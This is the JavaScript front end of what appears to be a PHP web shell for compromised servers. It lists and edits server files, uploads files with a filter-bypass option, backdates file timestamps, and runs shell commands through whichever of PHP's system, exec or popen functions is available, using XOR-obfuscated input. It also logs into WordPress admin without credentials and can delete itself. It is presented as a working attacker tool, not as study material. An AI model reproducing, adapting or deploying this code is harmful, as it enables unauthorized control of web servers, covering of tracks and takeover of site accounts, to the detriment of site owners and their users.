const urlObject = new URL(window.location.href)
const baseUrl = `${urlObject.origin}${urlObject.pathname}`

const essential_id = [
    'data_table',
    'path_div',
    'bypass-section',
    'tools',
    'wp-tools'
]

const additional_id = [
    'com-section'
]


function set_cookie_path(path, refresh=true) {

    document.cookie = "path=" + path;
    if(refresh) {
        location.href = "?";
    }
}

function change_path(obj) {

    remove_cookie("path");

    var path = obj.getAttribute("path");
    console.log("change path to " + path)
    set_cookie_path(path, false);
    changePath(path);
    init();
}

function changePath(path) {

    const wrapper = document.getElementById('path_div');


    wrapper.innerHTML = '';

    const paths = path.split('/').filter(Boolean); 


    let rootLink = document.createElement('a');
    rootLink.href = "#";
    rootLink.textContent = "/";
    rootLink.setAttribute("onclick", "change_path(this)")
    rootLink.setAttribute("path","/")
    wrapper.appendChild(rootLink);


    paths.forEach((pat, id) => {
        let tmpPath = '/' + paths.slice(0, id + 1).join('/');
        let link = document.createElement('a');
        link.href = "#";
        link.setAttribute('path', tmpPath);
        link.textContent = `${pat}/`;
        link.setAttribute("onclick", "change_path(this)");
        wrapper.appendChild(link);
    });
}

function get_current_path() {
    var path_div = document.getElementById("path_div").textContent
    var current_path = path_div.split('\n').join()
    return current_path;
}

function encodeXorString(str) {
    return stringToHex(xorEncryptDecrypt(str))
}

function selfDelete() {
    var confirm_text = "Are you sure want to delete yourself?";
    
    if(!confirm(confirm_text)) {
        return false;
    }

    fetch_url('sd').then((response) => { 
        if(!response.ok){
            set_message("Failed to delete self");
            return false;
        }
        response.json().then(resp_json => {
            if(resp_json.success) {
                set_message("Say goodbye to yourself!")
                window.location.href = '/';
                return;
            }
            set_message("Failed to delete self")
        }).catch(err => {
            set_message("ERROR: Parsing json")
            console.log(err)
        })
    })
}
function submit_com() {
    var cmd_func = localStorage.getItem("cmdFunc")
    var com_result = document.getElementById("com-result")

    if(!cmd_func || (cmd_func && cmd_func == '0')) {
        
        com_result.innerText = 'Can not execute command!!'
        return false;
    }
    
    var com_input = document.getElementById("com-input");
    
    if(!com_input.value) {
        return false;
    }

    var data = new FormData()

    data.append("function", cmd_func)
    data.append("value", encodeXorString(com_input.value))

    com_input.value = ''
    com_result.innerText = 'Processing...'

    post_url('ec', data, false).then((response) => {
        if(!response.ok) {
            com_result.innerText = 'Invalid status code';
            return;
        }
        response.json().then((resp_json) => {
            if(resp_json.output) {
                com_result.innerHTML = resp_json.output;
                return;
            }
            com_result.innerText = 'No output:('
        }).catch(err => {
            set_message("ERROR: Parsing JSON!");
            com_result.innerHTML = err;
        })
    })

}

function create_file() {
    
    var name = prompt("File name  ", "hello.php")
    var current_path = get_current_path();

    if(!name){
        return;
    }

    var current_path = prompt("Directory ", current_path)

    var destination = `${current_path}/${name}`
    set_cookie_file(destination);

    location.href = '?action=r';

}

function refresh_path() {        
    set_cookie_path(homePath, false); 
    init();
    changePath(homePath)

}
function remove_cookie(cookieName) {
    document.cookie = cookieName + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
}

function set_cookie_file(path) {
    remove_cookie("filename");
    document.cookie = "filename=" + stringToHex(xorEncryptDecrypt(path));
}

function change_file(obj, reload=true) {
    var path = obj.getAttribute("path");
    set_cookie_file(path);    
    if(reload){
        location.reload();
    }
}

function create_table_data(name, size, is_writable, date, is_dir) {
    

    var file_name = name.split('/').pop();

    var data = {
        "name":name, 
        "size":size, 
        "is_writable":is_writable,
        "date":date, 
    }

    var table_row = document.createElement("tr");


    for(var i in data) {
        var td = document.createElement("td");

        if(i == "name") {
            if(is_dir) {

                td.innerHTML = `<a href='#' onclick='change_path(this)' path='${data[i]}' class='ml-2em'><i class='fa-regular fa-folder mr-10'></i>${file_name}</a>`;

            }else{
                td.innerHTML = `<a href='?action=r' onclick='change_file(this)' path='${data[i]}' class='ml-2em'>${file_name}</a>`;
            }
        }else if(i == "date") {
            td.innerHTML += `<a href='#' class='white mr-10' path='${data.name}' onclick='touch_file(this)' value='${data.date}'>${date}</a>`
        
        }else{
            td.innerHTML = data[i];
        }

        if(i !== "name") {
            td.setAttribute("class","tc")
        }
        


        table_row.appendChild(td);
   }

    var td_actions = document.createElement("td");
    td_actions.setAttribute('class','tc');
   
    td_actions.innerHTML += `<a href='#' class='white mr-10' path='${file_name}' onclick='rename_file(this)' >R</a>`
    if(data.name.includes(docRoot) && data.name !== docRoot) {
        var file_url = window.location.origin + data.name.replace(docRoot, '/');
        td_actions.innerHTML += `<a href='${file_url}' target='_blank' class='mr-10 white'>V</a>`
    }
    td_actions.innerHTML += `<a href='#' class='red mr-10' path='${data.name}' onclick="delete_file(this)">D</a>`
    table_row.appendChild(td_actions);

    document.getElementById("data_table").appendChild(table_row);
}


function addClickListener(element_id, callback) {
    var element = document.getElementById(element_id)
    if(!element) {
        return;
    }
    element.addEventListener("click", function(ev) { 
        callback()
    })    
}

function touch_file(obj) {
    change_file(obj, false);
    var old_date = obj.getAttribute("value");
    var newdate = prompt("Enter your new date : ", old_date)
    if(newdate && newdate !== old_date) {
        var data = new FormData();
        
        data.append("date", newdate);

        set_message("Loading");
        post_url('to', data, false).then((response) => {
            if(!response.ok) {
                set_message("ERROR: Invalid response");
                return false;
            }
            response.json().then((resp) => {
                if(resp.success) {
                    set_message("Date modified!");
                    obj.innerText = newdate;
                    obj.setAttribute("value", newdate)
                }else{
                    set_message("ERROR: Failed to change modified date")
                }
            }).catch(err => {
                set_message("ERROR: Invalid parse json ")
                console.log(err)
            })
        })
    }

    
}

function change_data_info(obj, new_name) {
    var nodeChild = obj.parentElement.parentNode.getElementsByTagName("a");
    var file_name = obj.getAttribute("path").split('/').pop()
    for(i in nodeChild) {
        var childObject = nodeChild[i];
        if(childObject instanceof Element && childObject.hasAttribute("path")) {
            var childPath = childObject.getAttribute("path");
            var childPathSplit = childPath.split('/')
            childPathSplit[childPathSplit.length - 1] = new_name
            if(childPathSplit.length == 1) {
                childObject.removeAttribute("path");
                childObject.setAttribute("path", childPathSplit[0])
            }else{
                childObject.removeAttribute("path");
                childObject.setAttribute("path", childPathSplit.join('/'))
            }
            
            if(childObject.innerText == file_name) {
                childObject.innerHTML = childObject.innerHTML.replace(file_name, new_name)
            }
        }
    }
}
function rename_file(obj) {
    change_file(obj, false);
    var current_filename = obj.getAttribute("path")
    var newname = prompt("Enter your new name : ", current_filename)
    if(newname && newname !== current_filename) {
        var formdata = new FormData();
        formdata.append("new", newname);
        post_url('re', formdata, false).then((response) => {
            if(!response.ok) {
                set_message("ERROR: Invalid response");
                return false;
            }
        
            response.json().then((resp) => {
                
                if(resp.success) {
                    set_message("Renamed!");
                    change_data_info(obj, newname)
                }else{
                    set_message("ERROR: Failed to rename")
                }
            }).catch(err => {
                set_message("ERROR: Invalid parse json ")
                console.log(err)
            })
        })
    }
   

}
function delete_file(obj) {
    change_file(obj, false)
    blurTable();
    fetch_url('ul').then((response) => {
        if(!response.ok) {
            set_message("ERROR: Invalid response")
            return false
        }
        response.json().then((message) => {
            if(message.success){
                set_message("File Deleted!");
                obj.parentElement.parentNode.remove()
            }else{
                set_message("Can not delete")
            }
        }).catch(err => {
            set_message("ERROR: Parsing json")
            console.log(err)
        })
    })
    unblurTable();

    
}

function post_url(action, data, parse_json=true) {
    
    if(parse_json) {
        data = JSON.stringify(data);
    }
    
    var action = '?action=' + action;
    var response = fetch(action, {
        method: "POST",

        body: data
    })

    return response;
}

function stringToHex(str) {
    return str.split('')
              .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
              .join('');
}
function hexToString(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
}
function xorEncryptDecrypt(input, key="12") {
    let output = '';
    for(let i = 0; i < input.length; i++) {
        output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return output;
}

function process_upload(data, file_upload) {
    var current_path = get_current_path();
    set_message("Processing!")
    post_url('up', data, false).then((resp) => {
        if(!resp.ok){
            set_message("Error: Invalid status code")
            return false;
        }
        resp.json().then((j) => {
            if(j.success) {
                var filesize = (file_upload.size / 1024).toFixed(2)
                var last_modified = new Date(file_upload.lastModified).toLocaleString();
                var name = `${current_path}/${file_upload.name}`

                set_message("File Uploaded!")
                removeLinkByFilename(file_upload.name)

                create_table_data(name, filesize, '<p class="green">writable</p>', last_modified, false)
                return true;
            }
            set_message("ERROR: Failed to upload")
        }).catch((err) => {
            set_message("ERROR: Invalid parse json");
            console.log(err)
        })
    })
}

function handle_upload() {
    //stringToHex(xorEncryptDecrypt(path))
    var upload_input = document.getElementById("file-upload-input")
    var file_upload = upload_input.files[0];
    var bypass_upload = document.getElementById("bypass-upload")
    var reader = new FileReader()

    var data = new FormData()
    
    if(bypass_upload.checked) {
        
        reader.readAsArrayBuffer(file_upload)

        data.append("by",  true)
        reader.onload = function(event) {
            var arrayBuffer = event.target.result;
            var binaryString = '';
            var bytes = new Uint8Array(arrayBuffer);
            var len = bytes.byteLength;
            for (var i = 0; i < len; i++) {
                binaryString += String.fromCharCode(bytes[i]);
            }
            var encoded_content = utf8ToBase64(binaryString);
            var encoded_file = new File(
                [encoded_content],
                file_upload.name,
                {
                    type: "text/plain"
                }
            )
            data.append("import_file", encoded_file)
            process_upload(data, encoded_file)
        }
    }else{
        data.append("import_file", file_upload);
        process_upload(data, file_upload)
    }

    upload_input.value = ''

}

function utf8ToBase64(str) {
    // Convert the string to a Uint8Array of bytes
    return btoa(unescape(encodeURIComponent(str)));
}
async function textarea_handle() {
    var content = document.getElementById("content");
    var encoded_content = utf8ToBase64(content.value);
    
    set_message("Processing")
    var data = {
        "content":encoded_content
    }
    post_url('r', data).then((resp) => {
        resp.json().then((resp_json) => {
            if(resp_json.success) {
                set_message("Success!")
            }else{
                set_message("Failed!");
            }
        }).catch(err => {
            set_message("ERROR: Parsing json");
            console.log(err)
        })
    });
}
function removeLinkByFilename(filename) {
    const links = document.querySelectorAll('a[path]'); 

    links.forEach((link) => {
        if(link.innerText == filename) {
            link.parentElement.parentNode.remove()
        }
    })
}
function fetch_url(action) {
    var endpoint = "?action=" + action;
    return fetch(endpoint)
}

function set_message(message) {

    var notification = document.getElementById("notification");
    if(!notification) {
        notification = document.createElement("div")
        notification.setAttribute("class","notification")
        notification.setAttribute("id", "notification")
    }
    if(notification) {
        notification.innerText = "";
    }
    notification.innerText = message;
    
    var path_div = document.getElementById("path_div")
    if(path_div) {
        path_div.appendChild(notification)
    }
    
    setTimeout(function() {
        notification.remove()
    }, 3000)
}

function blurTable() {
    var table_id = document.getElementById("data_table");
    table_id.setAttribute("class", "blur-table");
}

function unblurTable() {
    var table_id = document.getElementById("data_table");
    table_id.removeAttribute("class")
}

function init() {
    
    var table_id = document.getElementById("data_table");
    blurTable();
    var response = fetch_url("d");


    
    response.then(function(resp) {
        if(!resp.ok){
            set_message("ERROR: Fetching url");
        }

        table_id.innerHTML = ''
        unblurTable()
        
        resp.json().then((element) => {
    
            element.sort((a, b) => {
                if(a.is_dir !== b.is_dir) {
                    return b.is_dir - a.is_dir
                }
                return a.path.localeCompare(b.path);
            })
            element.forEach(data => {
                var is_dir = data.is_dir;
                var path = data.path;
                var data_date = data.date;
                var is_writable = data.is_writable ? '<p class="green">writable</p>' : '<p class="red">writable</p>';
                create_table_data(path, data.size, is_writable, data_date, is_dir);
            });
        }).catch(err => {
            set_message("ERROR: Parsing json ")
            console.log(err)
        })
    })

}



function checkCommand() {
    var data = new FormData();
    
    var list_functions = [
        'system',
        'passthru',
        'exec',
        'shell_exec',
        'proc_open',
        'popen',
    ];

    data.append("data", list_functions.map(encodeXorString))
    post_url('cf', data, false).then((response) => {
        if(!response.ok){
            set_message("ERROR: Invalid status code");
            return false;
        }
        response.json().then((resp) => {
            
            if(!resp.avail) {
                localStorage.setItem("cmdFunc", "0");
                return false;
            }

            localStorage.setItem("cmdFunc", encodeXorString(resp.func));
            EssentialToggle(["command"]);

        }).catch(err => {
            set_message("ERROR: Invalid parse json");
            console.log(err)
        })

    })

}

function EssentialToggle(list_ids=essential_id) {
    for(var element_id in list_ids) {
        let element = document.getElementById(list_ids[element_id])
        if(!element) {
            continue;
        }
       element.classList.toggle("hidden");
    }
}

function AdditionalToggle() {
    EssentialToggle(additional_id)
    EssentialToggle(essential_id)

}

function show_command() {
    EssentialToggle();
   
    var cmd_id = document.getElementById("com-section")

    cmd_id.classList.remove("hidden")

}

function copy_path() {

    if(!path_div) {
        return false;
    }
    navigator.clipboard.writeText(get_current_path());
    set_message("Path Copied")
    
}

function wp_login() {
    set_message("Processing...");
    var data = new FormData();
    
    data.append("mode", "log")

    post_url("wp", data, false).then((response) => {
        if(!response.ok) {
            return false;
        }
        response.json().then((j) => {
            if(j.success) {
                var user_id = j.result;
                set_message(`Alright! Now you are ${user_id}`)
                window.location = `/wp-admin/`
                return;
            }
            set_message("Failed :(((")
        })
    })
}


  
document.addEventListener("DOMContentLoaded", function() {
    var table = document.getElementById("data_table");
    
    if(table) {
        init();
    }

    if(!localStorage.getItem("cmdFunc")) {
        checkCommand();
    }

    if(localStorage.getItem("cmdFunc") && localStorage.getItem("cmdFunc") !== '0') {
        EssentialToggle(["command"])
    }

    var com_input = document.getElementById("com-input");
    const menu_id = [
        {
            "id":"refresh-path",
            "callback":refresh_path
        },
        {
            "id":"create-file",
            "callback":create_file
        },
        {
            "id":"command",
            "callback":show_command
        }, 
        {
            "id":"submit-com",
            "callback":submit_com
        }, 
        {
            "id":"copy-path",
            "callback":copy_path,
        }, 
        {
            "id":"self-delete",
            "callback":selfDelete
        },
        {
            "id":"textarea-handle", 
            "callback":textarea_handle
        }, 
        {
            "id":"wp-login", 
            "callback":wp_login
        }, 
        {
            "id":"additional-toggle",
            "callback":AdditionalToggle
        }
        
    ]
    
    menu_id.forEach(data => {
        addClickListener(data.id, data.callback)
    })

    if(com_input) {
        com_input.addEventListener("keypress", function(event) {
            if(event.key == 'Enter') {
                submit_com();
            }
        })
    }
    
    
    
    var back_menu = document.getElementById("back_menu");
    if(back_menu) {
        document.getElementById("path_div").innerHTML = ''
    }

    if(loadFile && loadFile !== '0') {
        EssentialToggle(["wp-login"])
    }

});
